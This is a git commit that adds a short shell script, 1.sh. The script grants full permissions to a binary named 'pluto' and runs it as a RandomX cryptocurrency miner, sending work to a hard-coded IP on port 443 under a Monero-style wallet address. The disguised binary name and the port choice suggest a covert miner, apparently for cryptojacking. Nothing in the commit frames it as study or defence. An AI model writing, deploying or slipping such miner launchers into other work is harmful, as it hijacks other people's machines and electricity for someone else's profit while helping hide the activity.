d1a8ce3c013995def1b8adf6609276450abec2d4
Shin <dirianda187@gmail.com>
2026-05-06 14:52:22 +0700

    Create 1.sh

---
+++ 1.sh
@@ -0,0 +1,4 @@
+cd
+cd mainble
+chmod 777 pluto
+./pluto -a randomx -o 185.84.98.5:443 -u 876PV3gx5xAFrfsARXWyJ94AGfB9FjNFp3MxatiGPrAyCELXKjGUHd82ChZLPvhNo3g1Y9kpGZy5UMd23Q5Yn4mHLVT2dUy -p JUPITER -t 4
